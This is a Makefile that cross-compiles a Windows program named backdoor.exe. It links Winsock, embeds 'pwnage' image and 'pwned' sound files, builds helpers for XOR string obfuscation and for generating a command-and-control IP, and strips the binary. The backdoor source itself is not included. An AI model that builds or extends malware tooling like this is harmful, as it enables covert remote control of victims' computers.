CC=gcc
MINGCC=i686-w64-mingw32-gcc
MINGSTRIP=i686-w64-mingw32-strip

all: 	xor_string encode_bin make_cnc_ip pwnage_img.c pwned_sound.c backdoor.exe

backdoor.exe:
	$(MINGCC) backdoor.c pwnage_img.c pwned_sound.c -lwinmm -lws2_32 -o backdoor.exe
	$(MINGSTRIP) backdoor.exe

pwned_sound.c:
	./encode_bin pwned.mp3 pwned_sound.c pwned_sound

pwnage_img.c:
	./encode_bin pwnage.jpg pwnage_img.c pwnage_image

xor_string:
	$(CC) xor_string.c -o xor_string
	$(CC) encode_bin.c -o encode_bin
	$(CC) make_cnc_ip.c -o make_cnc_ip

clean:
	rm -f xor_string encode_bin make_cnc_ip backdoor.exe pwnage_img.c pwned_sound.c
